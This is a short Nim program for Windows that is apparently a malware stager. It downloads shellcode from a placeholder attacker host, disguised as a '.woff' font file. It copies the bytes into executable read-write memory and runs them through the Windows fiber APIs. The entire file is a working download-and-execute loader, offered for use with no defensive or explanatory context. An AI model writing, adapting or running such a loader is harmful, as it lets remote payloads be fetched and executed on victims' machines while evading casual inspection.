import winim/lean
import osproc
import std/httpclient

proc stringToBytes(s: string): seq[byte] =
    result = newSeqOfCap[byte](s.len)
    for c in s:
        result.add(c.uint8)

proc DownloadShellcode(url: string): seq[byte] =
    var body: string
    try:
        let client = newHttpClient()
        let response = client.get(url)
        if response.code != Http200:
            raise newException(OSError, "Failed to download shellcode: " & $response.code)
        body = response.body
    except:
        raise newException(OSError, "Failed to download shellcode")

    return stringToBytes(body)

proc RunFiber(shellcode: seq[byte]): void =
    let MasterFiber = ConvertThreadToFiber(NULL)
    let vAlloc = VirtualAlloc(NULL, cast[SIZE_T](shellcode.len), MEM_COMMIT, PAGE_EXECUTE_READ_WRITE)
    var bytesWritten: SIZE_T
    let pHandle = GetCurrentProcess()
    WriteProcessMemory(pHandle, vAlloc, unsafeAddr(shellcode[0]), cast[SIZE_T](shellcode.len), addr bytesWritten)
    let xFiber = CreateFiber(0, cast[LPFIBER_START_ROUTINE](vAlloc), NULL)
    SwitchToFiber(xFiber)

when defined(windows):
    echo "[*] Running in x64 process"

    # URL of the .woff file containing shellcode
    let shellcodeURL = "http://URLHEREBRO:8080/shellcode.woff"

    # Download and execute shellcode
    let shellcode = DownloadShellcode(shellcodeURL)
    RunFiber(shellcode)
